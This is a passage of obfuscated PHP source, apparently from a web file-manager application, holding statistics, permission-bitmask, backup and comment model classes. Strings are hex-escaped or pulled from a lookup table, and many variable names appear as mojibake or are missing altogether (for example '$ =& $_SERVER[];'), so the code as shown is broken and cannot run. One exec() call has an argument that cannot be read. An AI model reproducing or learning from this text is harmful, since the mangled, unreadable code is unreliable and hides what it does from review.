$Àïﬂ®[865]; $≈¢»∏ = Model($)->min($Àïﬂ®[225]); } $∆Ñ = $Àïﬂ®[1822] . ucfirst($Ãà); $ á = $this->dateList($≈¢»∏); foreach ($ á as $‘è) { $this->{$∆Ñ}($‘è); } return $this->listData(); } private function dateList($Íà¶) { $ =& $_SERVER[]; $ = $Íà¶; $«ò◊Å = strtotime($[1821]); $›ê = array(); while ($ <= $«ò◊Å) { $›ê[] = date($[1820], $); $ = strtotime($[1823], $); } return $›ê; } public function _recordUser($ = '') { $‘∏ =& $_SERVER[]; $ = strtotime(date($‘∏[1824], strtotime($))); $ÿæ‘∏ = strtotime(date($‘∏[1825], strtotime($))); $‚îΩ = array($‘∏[225] => array($‘∏[1054], $ÿæ‘∏)); $ = Model($‘∏[576])->where($‚îΩ)->count($‘∏[1685]); $‚îΩ[$‘∏[225]] = array($‘∏[386], array($, $ÿæ‘∏)); $ î = Model($‘∏[576])->where($‚îΩ)->count($‘∏[1685]); $‚îΩ[$‘∏[43]] = $‘∏[1826]; $ = Model($‘∏[1827])->where($‚îΩ)->count($‘∏[1828]); $“º = array($‘∏[249] => $, $‘∏[805] => (int) $, $‘∏[1813] => (int) $ î, $‘∏[1814] => (int) $); return $this->insert($“º); } public function _recordStore($Îºû = '') { $—ª =& $_SERVER[]; $ = strtotime(date($—ª[1825], strtotime($Îºû))); $ = array($—ª[225] => array($—ª[1054], $)); $—±»≠ = Model($—ª[521])->where($)->sum($—ª[86]); $[$—ª[462]] = 0; $–á = Model($—ª[865])->where($)->sum($—ª[86]); $[$—ª[188]] = 1; $·°î = Model($—ª[865])->where($)->sum($—ª[86]); $[$—ª[188]] = 2; $ = Model($—ª[865])->where($)->sum($—ª[86]); $“ú = array($—ª[249] => $Îºû, $—ª[803] => (int) $–á, $—ª[1817] => (int) $—±»≠, $—ª[1818] => (int) $·°î, $—ª[1819] => (int) $); return $this->insert($“ú); } public function trend($Ÿ≠, $) { $À≤∆ù =& $_SERVER[]; if (!$this->init($Ÿ≠)) { return !1; } $ = $this->trendList($Ÿ≠); if ($ && $ != $À≤∆ù[1658]) { $Ÿ≠ = $[0][$À≤∆ù[249]]; $ = $this->validDate($, $Ÿ≠); $√π = array(); $’ô = array_to_keyvalue($, $À≤∆ù[249]); foreach ($ as $ÃØ) { if (isset($’ô[$ÃØ])) { $≈ìÕê = $’ô[$ÃØ]; } else { $≈ìÕê = end($); $≈ìÕê[$À≤∆ù[249]] = $ÃØ; if ($Ÿ≠ == $À≤∆ù[639]) { $≈ìÕê[$À≤∆ù[1813]] = $≈ìÕê[$À≤∆ù[1814]] = 0; } } $√π[] = $≈ìÕê; } $ = $√π; } $«ã∆ü = array($À≤∆ù[639] => array($À≤∆ù[805] => LNG($À≤∆ù[1829]), $À≤∆ù[1813] => LNG($À≤∆ù[1830]), $À≤∆ù[1814] => LNG($À≤∆ù[1831])), $À≤∆ù[1815] => array($À≤∆ù[803] => LNG($À≤∆ù[1832]), $À≤∆ù[1817] => LNG($À≤∆ù[1833]), $À≤∆ù[1818] => LNG($À≤∆ù[1834]), $À≤∆ù[1819] => LNG($À≤∆ù[1835]))); $€Ñ = array($À≤∆ù[639] => $À≤∆ù[1836], $À≤∆ù[1815] => $À≤∆ù[86]); if (empty($)) { $ÃØ = date($À≤∆ù[1820], strtotime($À≤∆ù[1821])); $√ø÷µ = array($À≤∆ù[249] => $ÃØ); foreach ($«ã∆ü[$Ÿ≠] as $È°Ñ => $) { $√ø÷µ[$È°Ñ] = 0; } $[] = $√ø÷µ; } $’ì = array(); foreach ($ as $) { if ($Ÿ≠ == $À≤∆ù[1815] && $[$À≤∆ù[1817]] > $[$À≤∆ù[803]]) { $[$À≤∆ù[1817]] = $[$À≤∆ù[803]]; } foreach ($«ã∆ü[$Ÿ≠] as $È°Ñ => $) { $≈ìÕê = array($À≤∆ù[249] => $[$À≤∆ù[249]], $À≤∆ù[1582] => $); $≈ìÕê[$€Ñ[$Ÿ≠]] = isset($[$È°Ñ]) ? $[$È°Ñ] : 0; $’ì[] = $≈ìÕê; } } return $’ì; } public function validDate($ÿã, $«ßÃë) { $ƒ∂ =& $_SERVER[]; $›Ñ“¶ = date($ƒ∂[1820], strtotime($ƒ∂[1821])); $ ù = array($›Ñ“¶); switch ($ÿã) { case $ƒ∂[1665]: $Ë¢Ü = mktime(0, 0, 0, date($ƒ∂[1837]), date($ƒ∂[1401]) - date($ƒ∂[1464]) + 7 - 7, date($ƒ∂[1838])); $Óè≥ = 0; do { $ÿ© = date($ƒ∂[1820], $Ë¢Ü - 3600 * 24 * 7 * $Óè≥); $ ù[] = $ÿ©; $Óè≥++; } while ($«ßÃë < $ÿ©); break; case $ƒ∂[1663]: $Óè≥ = 1; do { $ = date($ƒ∂[1839], strtotime("\x2d\x20{$Óè≥}\40\155\x6f\156\x74\x68\163")); $ ù[] = $; $Óè≥++; } while ($«ßÃë < $); break; case $ƒ∂[1840]: $ = (int) date($ƒ∂[1838], strtotime($«ßÃë)); $ = (int) date($ƒ∂[1838]); if ($ >= $) { break; } for ($; $ < $; $++) { $ ù[] = $ . $ƒ∂[1841]; } break; default: break; } if ($«ßÃë > end($ ù)) { array_pop($ ù); } sort($ ù); return $ ù; } public function listTable($) { $◊Ç’ö = ucfirst($); return Model($◊Ç’ö)->listData(); } public function option($…∏) { $ÿï = $_SERVER[][1842] . ucfirst($…∏); return $this->{$ÿï}(); } private function optionUser() { $œ¢ =& $_SERVER[]; $ﬂú = Model($œ¢[576])->count($œ¢[1685]); $ = Model($œ¢[576])->where($œ¢[1843])->count($œ¢[1685]); $ = intval($GLOBALS[$œ¢[16]][$œ¢[402]][$œ¢[1637]]) / 3600; $Êªª = strtotime("\x2d{$}\40\x68\157\x75\162\163"); $ = strtotime(date($œ¢[1824])); if ($Êªª < $) { $Êªª = $; } $ÍÜ∫ = array($œ¢[1844] => array($œ¢[1055], $Êªª)); $◊£⁄à = (int) Model($œ¢[576])->where($ÍÜ∫)->count($œ¢[1685]); if (!$◊£⁄à) { $◊£⁄à = 1; } $ÍÜ∫ = array($œ¢[1844] => array($œ¢[1055], $)); $ = Model($œ¢[576])->where($ÍÜ∫)->count($œ¢[1685]); return array($œ¢[798] => (int) $ﬂú, $œ¢[1845] => (int) ($ﬂú - $), $œ¢[1846] => (int) $, $œ¢[1847] => (int) $, $œ¢[1848] => $◊£⁄à); } private function optionFile() { $ ∂ =& $_SERVER[]; $·íÇ = $this->sourceSize(); $Œ¶ = $·íÇ[$ ∂[86]]; $”∞ = $·íÇ[$ ∂[1817]]; $ = Model($ ∂[865])->where(array($ ∂[462] => 0))->count($ ∂[191]); $ = array($ ∂[462] => 0, $ ∂[225] => array($ ∂[1055], strtotime(date($ ∂[1824])))); $ÈÑ´ = Model($ ∂[865])->where($)->sum($ ∂[86]); $¬æÚà∂É = Model($ ∂[865])->where($)->count($ ∂[191]); return array($ ∂[803] => $Œ¶, $ ∂[1817] => $”∞, $ ∂[1849] => $Œ¶ - $”∞, $ ∂[1850] => (int) $ÈÑ´, $ ∂[805] => (int) $, $ ∂[1851] => (int) $¬æÚà∂É); } private function optionAccess() { $«ñ =& $_SERVER[]; return array($«ñ[798] => $this->typeLogCnt(), $«ñ[117] => $this->typeLogCnt($«ñ[117]), $«ñ[502] => $this->typeLogCnt($«ñ[502]), $«ñ[1852] => $this->typeLogCnt($«ñ[1852]), $«ñ[1853] => $this->typeLogCnt($«ñ[1853]), $«ñ[639] => $this->typeLogCnt($«ñ[22], $«ñ[1828])); } private function typeLogCnt($ = '', $ = "\x69\144") { $Ôü° =& $_SERVER[]; $„µê = array($Ôü°[117] => array($Ôü°[1854], $Ôü°[1855]), $Ôü°[502] => array($Ôü°[1856], $Ôü°[1857]), $Ôü°[1852] => array($Ôü°[1858], $Ôü°[1859], $Ôü°[1860]), $Ôü°[1853] => array($Ôü°[1861], $Ôü°[1862]), $Ôü°[1863] => array($Ôü°[1864], $Ôü°[1865], $Ôü°[1866])); $ = strtotime(date($Ôü°[1824])); $¬° = array($Ôü°[225] => array($Ôü°[1055], $)); if ($) { $¬°[$Ôü°[43]] = array($Ôü°[17], $„µê[$]); } $ = Model($Ôü°[1827])->where($¬°)->count($); return (int) $; } private function optionServer() { $—ª =& $_SERVER[]; $◊∂…ø = $this->diskDriver(); $‰Øô = KodIO::defaultDriver(); $ = array($—ª[857] => $‰Øô[$—ª[452]]); $“Æ = Model($—ª[521])->where($)->sum($—ª[86]); $ = explode($—ª[63], $_SERVER[$—ª[154]]); $‹ü = $[0]; $…¶ = $GLOBALS[$—ª[16]][$—ª[31]]; $ = $…¶[$—ª[1017]]; if ($ == $—ª[1005]) { $›π = explode($—ª[1323], $…¶[$—ª[1016]]); $ = $›π[0]; } if ($ == $—ª[953] || $ == $—ª[844]) { $ŒíÏ∞∂ = Model()->db()->query($—ª[1867]); $√ã‘© = $ŒíÏ∞∂[0] && isset($ŒíÏ∞∂[0][$—ª[1581]]) ? $ŒíÏ∞∂[0][$—ª[1581]] : 0; $ = $—ª[1868] . ($√ã‘© ? $—ª[18] . $√ã‘© : $—ª[22]); } $¬£ = $GLOBALS[$—ª[16]][$—ª[402]][$—ª[867]]; return array($—ª[1869] => $◊∂…ø ? $◊∂…ø[$—ª[1870]] : 0, $—ª[1871] => $◊∂…ø ? $◊∂…ø[$—ª[1872]] : 0, $—ª[1873] => (int) $‰Øô[$—ª[1870]] * 1024 * 1024 * 1024, $—ª[1874] => (int) $“Æ, $—ª[1875] => ucfirst($‹ü), $—ª[1876] => $—ª[1877] . PHP_VERSION, $—ª[1878] => phpBuild64() ? 64 : 32, $—ª[797] => str_replace($—ª[1171], $—ª[1033], $), $—ª[402] => ucfirst($¬£), $—ª[42] => $_SERVER[$—ª[1879]]); } private function diskDriver() { $Ãº =& $_SERVER[]; $√í = $Ãº[18]; $‰ë¨ = $GLOBALS[$Ãº[16]][$Ãº[1340]] == $Ãº[1341]; if ($‰ë¨) { $√í = $Ãº[1880]; if (function_exists($Ãº[1881])) { exec($Ãº[1882], $); $√í = $[1] . $Ãº[18]; } } if (!file_exists($√í)) { return; } $⁄à = @disk_total_space($√í); $Ó∂ë = $⁄à - @disk_free_space($√í); return array($Ãº[1870] => $⁄à, $Ãº[1872] => $Ó∂ë); } public function fileChart($¬¨) { $ =& $_SERVER[]; if (isset($¬¨[$[1685]])) { return Model($[865])->userFileTypeProfile($¬¨[$[1685]]); } if (isset($¬¨[$[1883]])) { return Model($[865])->groupFileTypeProfile($¬¨[$[1883]]); } $ = $this->sourceSize(); $ÂüΩÀª = array($[190] => 0, $[188] => 1); $∆ï = Model($[865])->where($ÂüΩÀª)->sum($[86]); $ÂüΩÀª[$[188]] = 2; $ﬁØ = Model($[865])->where($ÂüΩÀª)->sum($[86]); return array($[803] => $[$[86]], $[1817] => $[$[1817]], $[1818] => (int) $∆ï, $[1819] => (int) $ﬁØ); } private function sourceSize() { $ =& $_SERVER[]; $ Ω = Model($[865])->where(array($[462] => 0))->sum($[86]); $ = Model($[521])->sum($[86]); if ($ > $ Ω) { $ = $ Ω; } return array($[86] => (int) $ Ω, $[1817] => (int) $); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Ã© =& $_SERVER[]; $ = array(array($Ã©[471] => LNG($Ã©[1884]), $Ã©[1885] => $Ã©[1886], $Ã©[1887] => 1, $Ã©[1888] => 1, $Ã©[1889] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ã©[471] => LNG($Ã©[1890]), $Ã©[1885] => $Ã©[1891], $Ã©[1887] => 2, $Ã©[1888] => 1, $Ã©[1889] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ã©[471] => LNG($Ã©[1892]), $Ã©[1885] => $Ã©[1893], $Ã©[1887] => 3, $Ã©[1888] => 1, $Ã©[1889] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ã©[471] => LNG($Ã©[1894]), $Ã©[1885] => $Ã©[1895], $Ã©[1887] => 4, $Ã©[1888] => 1, $Ã©[1889] => self::AUTH_SHOW | self::AUTH_VIEW), array($Ã©[471] => LNG($Ã©[1896]), $Ã©[1885] => $Ã©[1897], $Ã©[1887] => 5, $Ã©[1888] => 1, $Ã©[1889] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Ã©[471] => LNG($Ã©[1898]), $Ã©[1885] => $Ã©[1899], $Ã©[1887] => 6, $Ã©[1888] => 1, $Ã©[1889] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Ã©[471] => LNG($Ã©[1900]), $Ã©[1885] => $Ã©[1901], $Ã©[1887] => 7, $Ã©[1888] => 1, $Ã©[1889] => 0)); return $; } public static function authCheck($, $‹©) { $ =& $_SERVER[]; $ = intval($); if ($GLOBALS[$[545]] && $GLOBALS[$[16]][$[1902]]) { return !0; } if ($ <= 0) { return !1; } if (($ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ & $‹©); } public static function authCheckShow($) { return self::authCheck($, self::AUTH_SHOW); } public static function authCheckView($) { return self::authCheck($, self::AUTH_VIEW); } public static function authCheckDownload($ﬂî) { return self::authCheck($ﬂî, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ﬂ∑) { return self::authCheck($ﬂ∑, self::AUTH_UPLOAD); } public static function authCheckEdit($…ò) { return self::authCheck($…ò, self::AUTH_EDIT); } public static function authCheckRemove($—ù) { return self::authCheck($—ù, self::AUTH_REMOVE); } public static function authCheckShare($“â) { return self::authCheck($“â, self::AUTH_SHARE); } public static function authCheckComment($÷∫) { return self::authCheck($÷∫, self::AUTH_COMMENT); } public static function authCheckEvent($…Ä) { return self::authCheck($…Ä, self::AUTH_EVENT); } public static function authCheckRoot($Ë†•) { return self::authCheck($Ë†•, self::AUTH_ROOT); } public static function authCheckAction($Õ±, $) { $Èßâ =& $_SERVER[]; $ = array($Èßâ[1903] => self::AUTH_VIEW, $Èßâ[1235] => self::AUTH_DOWNLOAD, $Èßâ[117] => self::AUTH_UPLOAD, $Èßâ[1853] => self::AUTH_EDIT, $Èßâ[1852] => self::AUTH_REMOVE, $Èßâ[1863] => self::AUTH_SHARE, $Èßâ[407] => self::AUTH_COMMENT, $Èßâ[1673] => self::AUTH_EVENT, $Èßâ[1904] => self::AUTH_ROOT); if (!isset($[$])) { return; } $Œ¨ = $[$]; $Õ± = intval($Õ±); if ($Õ± <= 0) { return !1; } if (($Õ± & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Õ± & $Œ¨); } public static function authDisable($–Ö, $≈¨) { if (intval($–Ö) <= 0) { return 0; } return intval($–Ö) & ~$≈¨; } public $optionType = "\123\171\x73\x74\145\155\56\163\x6f\165\162\143\x65\x41\x75\x74\x68\114\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\141\165\x74\150", "\x6c\x61\142\x65\x6c", "\x64\x69\x73\160\x6c\x61\x79", "\163\x79\163\x74\x65\155", "\x73\x6f\x72\164"); public function initData() { $ = $this->authDefault(); foreach ($ as $) { $this->add($); } } public function findAuth($, $) { $ =& $_SERVER[]; $“Ç = parent::listData(); foreach ($“Ç as $‚âπ) { $ŸÜÕÜ = intval($‚âπ[$[464]]); if ($ŸÜÕÜ <= 0 || $‚âπ[$[1905]] == 0) { continue; } if (($ŸÜÕÜ & $) != $) { continue; } if (($ŸÜÕÜ & $) != 0) { continue; } return $‚âπ[$[452]]; } return !1; } public function findAuthReadOnly() { $ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $‹¶ƒ° = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($, $‹¶ƒ°); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Õ° =& $_SERVER[]; $ = parent::listData(); $Ó•ª = !1; foreach ($ as $€º) { if ($€º[$Õ°[464]] <= 0 || $€º[$Õ°[1905]] == $Õ°[222]) { continue; } if (!$Ó•ª) { $Ó•ª = $€º; continue; } if ($Ó•ª[$Õ°[464]] > $€º[$Õ°[464]]) { $Ó•ª = $€º; } } return $Ó•ª ? $Ó•ª[$Õ°[452]] : $Õ°[22]; } public function listData($ = false, $ﬂ° = "\x73\157\x72\x74", $◊∞ = false) { return parent::listData($, $ﬂ°, $◊∞); } public function update($”ô, $) { $Óü° =& $_SERVER[]; $ = parent::listData($”ô); $ = $this->findByName($[$Óü°[42]]); if (!$ || $ && $[$Óü°[452]] != $[$Óü°[452]]) { return !1; } $this->filterAuth($[$Óü°[464]]); return parent::update($”ô, $); } public function remove($«í‰É®) { $ = parent::listData($«í‰É®); if (!$ || $[$_SERVER[][189]]) { return !1; } return parent::remove($«í‰É®); } public function add($—Ñ = array()) { $ =& $_SERVER[]; if ($this->findByName($—Ñ[$[42]])) { return !1; } $ËÜú = array($[42] => $[22], $[464] => 1, $[1906] => $[1893], $[1905] => 1, $[189] => 0, $[1907] => 0); $—Ñ = array_merge($ËÜú, $—Ñ); $—Ñ[$[1907]] = $this->getSort(); $this->filterAuth($—Ñ[$[464]]); return parent::insert($—Ñ); } private function getSort() { $·∂Ø =& $_SERVER[]; $ = parent::listData(); $‹∫—Å = array_to_keyvalue($, $·∂Ø[22], $·∂Ø[1907]); return empty($‹∫—Å) ? 0 : max($‹∫—Å) + 1; } private function filterAuth(&$ÀÉ) { if (!$ÀÉ) { return; } $ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ = array(); foreach ($ as $√ä) { if ($ÀÉ & $√ä) { $[] = $√ä; } } if (in_array(self::AUTH_ROOT, $)) { $ÀÉ = array_sum($); return; } $“Ω = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ as $√ä) { if (isset($“Ω[$√ä])) { $ = array_merge($, $“Ω[$√ä]); } } $[] = self::AUTH_SHOW; $ÀÉ = array_sum(array_unique($)); } public function sort($⁄≤, $) { return parent::update($⁄≤, $); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\x62\x61\x63\x6b\x75\x70\114\151\163\164"; public $field = array("\151\x6f", "\156\141\155\x65", "\x73\x74\141\164\x75\163", "\143\157\156\164\145\x6e\x74", "\155\141\156\165\x61\154", "\162\x65\163\165\154\164", "\164\151\155\x65\106\x72\157\155", "\164\x69\155\x65\x54\x6f"); public function config() { $ﬂ∑ =& $_SERVER[]; $ = Model($ﬂ∑[810])->get($ﬂ∑[820]); $ = json_decode($, !0); $ = is_array($) ? $ : array(); if (!isset($[$ﬂ∑[794]])) { $[$ﬂ∑[794]] = $ﬂ∑[98]; } unset($[$ﬂ∑[1655]]); Action($ﬂ∑[1908])->taskInit(); Model($ﬂ∑[1654])->cacheClear(); $€ø = $ﬂ∑[1909]; $–º = Model($ﬂ∑[1910])->findByKey($ﬂ∑[1673], $€ø); if (!$–º) { $–º = array(); } if (isset($–º[$ﬂ∑[204]])) { $–º[$ﬂ∑[204]] = json_decode($–º[$ﬂ∑[204]], !0); } if (isset($[$ﬂ∑[204]])) { $–º[$ﬂ∑[204]][$ﬂ∑[1658]] = $[$ﬂ∑[204]]; unset($[$ﬂ∑[204]]); } return array_merge($–º, $); } public function listData($∆¢ = false, $◊¨ = "\x6d\x6f\144\151\146\171\124\x69\155\x65", $ = false) { return parent::listData($∆¢, $◊¨, !0); } public function lastItem() { $—ö = $this->listData(); return !empty($—ö[0]) ? $—ö[0] : null; } public function kill($¬ö) { $–´ =& $_SERVER[]; $“ï = $this->listData($¬ö); if (!$“ï || empty($“ï[$–´[42]])) { return !0; } Task::kill($–´[819]); Task::kill($–´[840]); Task::kill($–´[849]); $ = $“ï[$–´[42]]; $ = TEMP_FILES . $–´[818] . $ . $–´[18]; IO::remove($, !1); return $this->remove($¬ö); } public function remove($”∂) { $ = $this->listData($”∂); if (!$) { return !0; } return $this->backupRemove($); } private function backupRemove($‡•õ) { parent::remove($‡•õ[$_SERVER[][452]]); $ £ = $this->backupPath($‡•õ); IO::remove($ £, !1); return !0; } private function backupPath($) { $ =& $_SERVER[]; $ = $[$[42]]; $◊≠ = Model($[810])->get($[811]); $ = substr(md5($[812] . $◊≠ . $), 0, 8); return "\173\151\x6f\x3a{$[$[791]]}\x7d\57\144\x61\x74\x61\x62\141\163\x65\57\142\141\x63\153\x75\160\57" . $ . $[21] . $; } public function start() { $Ëï¥ =& $_SERVER[]; if ($GLOBALS[$Ëï¥[16]][$Ëï¥[99]][$Ëï¥[1911]] != $Ëï¥[98]) { return !0; } $»à = $this->config(); if (!$»à || $»à[$Ëï¥[1655]] != $Ëï¥[98]) { return !1; } $ = $this->process(); foreach ($ as $) { if ($) { return Task::restart($[$Ëï¥[452]]); } } $ = new Backup(); $ = $->db(); if ($) { $ = $->dbFile(); if ($ && $»à[$Ëï¥[794]] == $Ëï¥[222]) { $ = $->file(); } } Backup::set(array($Ëï¥[790] => 1, $Ëï¥[801] => time())); return !0; } public function process() { $ﬂ† =& $_SERVER[]; $”∏ = array($ﬂ†[797] => Task::get($ﬂ†[819]), $ﬂ†[802] => Task::get($ﬂ†[840]), $ﬂ†[224] => Task::get($ﬂ†[849])); $“∫‚≤ä = !1; foreach ($”∏ as &$∆∂) { if ($“∫‚≤ä) { $∆∂ = !1; continue; } if ($∆∂) { $ŸÄ¬∂ = intval(_get($∆∂, $ﬂ†[1690], 0)); if (time() - $ŸÄ¬∂ > 7200) { Task::kill($∆∂[$ﬂ†[452]]); $“∫‚≤ä = !0; $∆∂ = !1; } } } return $”∏; } public function restore() { $ =& $_SERVER[]; ActionCall($[1101], !0, 1); ActionCall($[1101], !0, 0); } } goto BŒò; BŒò: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\145\156\164"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\x61\x6d\145" => "\x63\157\x6d\155\145\x6e\x74\x5f\155\x65\164\x61", "\x6d\145\x74\141\106\151\145\x6c\144" => "\x63\157\155\155\145\156\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($œç÷ñ) { $ =& $_SERVER[]; if ($œç÷ñ[$[1912]]) { $¬ä = $this->where(array($[1913] => $œç÷ñ[$[1912]]))->find(); if (!$¬ä || $¬ä[$[188]] != $œç÷ñ[$[188]] || $¬ä[$[547]] != $œç÷ñ[$[547]]) { return !1; } $this->where(array($[1913] => $œç÷ñ[$[1912]]))->setAdd($[1914], 1); } $œç÷ñ[$[1915]] = 0; $œç÷ñ[$[1914]] = 0; $œç÷ñ[$[790]] = 1; return $this->add($œç÷ñ); } public function commentCount($, $, $—è = false) { $“ïÂ∂é =& $_SERVER[]; if (!$) { return array(); } if (is_string($) || is_int($)) { $ = array($); } $ = array($“ïÂ∂é[547], $“ïÂ∂é[1916] => $“ïÂ∂é[542]); $—∫ = array($“ïÂ∂é[547] => array($“ïÂ∂é[17], $), $“ïÂ∂é[188] => $); if ($—è) { $—∫[$“ïÂ∂é[1685]] = $—è; } $≈à = $this->field($)->where($—∫)->group($“ïÂ∂é[547])->select(); return array_to_keyvalue($≈à, $“ïÂ∂é[547], $“ïÂ∂é[542]); } public function starTarget($◊†, $) { $≈Å =& $_SERVER[]; $ = $◊† + self::TYPE_STAR_OFFSET; $Ÿ¶∆∫…∫ = array($≈Å[1685] => USER_ID, $≈Å[188] => $, $≈Å[547] => $); $ = $this->where($Ÿ¶∆∫…∫)->find(); if ($) { return $this->where(array($≈Å[452] => $[$≈Å[452]]))->delete(); } $ = array($≈Å[1912] => 0, $≈Å[1685] => USER_ID, $≈Å[790] => 1, $≈Å[794] => $≈Å[22], $≈Å[188] => $, $≈Å[547] => $, $≈Å[1915] => 0, $≈Å[1914] => 0); return $this->add($); } public function starTargetCount($√ï–ä, $ÿ≠) { $ =& $_SERVER[]; $ = $ÿ≠ + self::TYPE_STAR_OFFSET; $Ïù´ = $this->commentCount($√ï–ä, $); $“õ = $this->commentCount($√ï–ä, $, USER_ID); return array($[1917] => $Ïù´, $[1918] => $“õ); } public function starTargetUserList($”´, $) { $ =& $_SERVER[]; $‚ßë Ñ = $”´ + self::TYPE_STAR_OFFSET; $ = array($[547] => $, $[188] => $‚ßë Ñ); $ﬂë = $this->where($)->count(); $ﬁ£ = array($[308] => $ﬂë, $[1919] => array()); if (!$ﬂë) { return $ﬁ£; } $ﬂõ = $this->field($[1685])->where($)->limit(500)->select(); $ﬂõ = array_to_keyvalue($ﬂõ, $[22], $[1685]); $ﬁ£[$[1919]] = Model($[555])->userListInfo($ﬂõ); return $ﬁ£; } public function prasiseUserList($) { $ÿÅ‹™ =& $_SERVER[]; $ = array($ÿÅ‹™[1920] => $); $‹ü = $this->where($)->find(); $∆° = _get($‹ü, $ÿÅ‹™[1915], 0); $ = array($ÿÅ‹™[308] => $∆°, $ÿÅ‹™[1919] => array()); if (!$∆°) { return $; } $ = Model($ÿÅ‹™[1921])->field($ÿÅ‹™[1685])->where($)->limit(500)->select(); $ = array_to_keyvalue($, $ÿÅ‹™[22], $ÿÅ‹™[1685]); $[$ÿÅ‹™[1919]] = Model($ÿÅ‹™[555])->userListInfo($); return $; } public function remove($ÿµ) { $ﬂÇ =& $_SERVER[]; $ = array($ﬂÇ[1913] => $ÿµ); $÷¶ﬂ™ = $this->where($)->find(); if ($÷¶ﬂ™[$ﬂÇ[1912]]) { $this->where(array($ﬂÇ[1913] => $÷¶ﬂ™[$ﬂÇ[1912]]))->setAdd($ﬂÇ[1914], -1); } return $this->where($)->delete(); } public function edit($‰´ò, $) { $«Ω≈¨ =& $_SERVER[]; $«≥◊π = array($«Ω≈¨[1913] => $‰´ò); return $this->where($«≥◊π)->save(array($«Ω≈¨[1922] => $)); } public function prasise($–ñ) { $ =& $_SERVER[]; $»Ñ = Model($[1923]); $’≥ = array($[1913] => $–ñ, $[1676] => USER_ID); $ = $»Ñ->where($’≥)->find(); if (!$) { $»Ñ->add($’≥); $ = $this->where(array($[1913] => $–ñ))->setAdd($[1915], 1); } else { $»Ñ->where($’≥)->delete(); $ = $this->where(array($[1913] => $–ñ))->setAdd($[1915], -1); } return $; } public function targetInfo($∆ì, $≈º) { $ÈÄç–° =& $_SERVER[]; $…Ω = array($ÈÄç–°[625] => $∆ì, $ÈÄç–°[626] => $≈º); $Ëì® = $this->where($…Ω)->count(); $‰ßæ É = "\122\111\x47\110\124\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\143\157\x6d\155\145\156\x74\137\160\162\x61\x69\163\145\x20\x73\164\x61\x72\40\157\156\40\143\157\155\155\145\x6e\164\56\143\x6f\x6d\x6d\145\x6e\x74\x49\x44\40\x3d\40\163\x74\141\162\x2e\143\157\x6d\x6d\x65\156\164\x49\x44"; $Ëùë = $this->alias($ÈÄç–°[407])->where($…Ω)->join($‰ßæ É, $ÈÄç–°[1924])->count(); $‹ïÊ±î = array($ÈÄç–°[1925] => $Ëì®, $ÈÄç–°[1926] => $Ëùë); return $‹ïÊ±î; } public function listData($) { $ =& $_SERVER[]; if (isset($[$[1927]])) { if ($[$[1927]]) { $[$[1920]] = array($[1055], intval($[$[1927]])); } unset($[$[1927]]); } if (isset($[$[1928]])) { if ($[$[1928]]) { $[$[1920]] = array($[1052], intval($[$[1928]])); } unset($[$[1928]]); } return $this->_listData($); } private function _listData($…Ø) { $ =& $_SERVER[]; $ = $this->where($…Ø)->_makeOrder()->selectPage(100); $this->_listAppendParent($[$[422]]); $this->_listAppendUser($[$[422]]); $this->_listAppendMeta($[$[422]]); return $; } private function _makeOrder() { $‘´ =& $_SERVER[]; $ = array($‘´[1915], $‘´[1914], $‘´[225]); $ = Input::get($‘´[507], $‘´[17], $‘´[474], $); $Á≠ß = Input::get($‘´[508], $‘´[17], $‘´[1678], array($‘´[1929], $‘´[503])); $ = $ . $‘´[63] . $Á≠ß; return $this->order($); } private function _listAppendParent(&$) { $ =& $_SERVER[]; $Íòã = array_unique(array_to_keyvalue($, $[22], $[1912])); 